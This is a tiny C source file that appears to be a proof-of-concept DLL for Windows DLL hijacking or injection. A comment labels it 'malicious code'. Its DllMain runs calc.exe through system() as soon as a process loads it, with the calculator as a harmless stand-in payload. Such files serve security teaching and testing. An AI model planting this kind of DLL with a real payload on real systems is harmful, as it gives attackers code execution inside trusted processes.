#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID
	lpReserved)
{
	// malicious code
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
		system("c:\\windows\\system32\\calc.exe");
	
	return 0;
}
